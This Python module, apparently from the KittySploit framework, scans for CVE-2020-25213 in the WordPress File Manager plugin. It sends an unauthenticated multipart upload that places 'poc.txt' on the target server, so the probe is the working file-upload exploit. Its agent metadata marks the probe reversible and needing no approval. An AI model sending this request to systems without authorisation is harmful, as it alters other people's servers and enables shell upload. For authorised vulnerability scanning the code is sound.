#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WordPress File Manager plugin prior to version 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress File Manager Plugin - Remote Code Execution Detection',
        'description': 'The WordPress File Manager plugin prior to version 6.9 is susceptible to remote code execution. The vulnerability allows unauthenticated remote attackers to upload .php files.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'rce', 'kev', 'fileupload', 'intrusive', 'packetstorm', 'webdesi9', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://plugins.trac.wordpress.org/changeset/2373068',
            'https://github.com/w4fz5uck5/wp-file-manager-0day',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25213',
            'http://packetstormsecurity.com/files/160003/WordPress-File-Manager-6.8-Remote-Code-Execution.html',
            'http://packetstormsecurity.com/files/171650/WordPress-File-Manager-6.9-Shell-Upload.html',
        ],
        'cve': 'CVE-2020-25213',
    }

    def run(self):
        path = '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=------------------------ca81ac1fececda48'}, data='--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name="reqid"\n\n17457a1fe6959\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name="cmd"\n\nupload\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name="target"\n\nl1_Lw\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name="mtime[]"\n\n1576045135\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name="upload[]"; filename="poc.txt"\nContent-Type: text/plain\n\npoc-test\n--------------------------ca81ac1fececda48--\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('poc.txt', 'added',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='WordPress File Manager Plugin - Remote Code Execution detected', path=path)
            return True
        return False

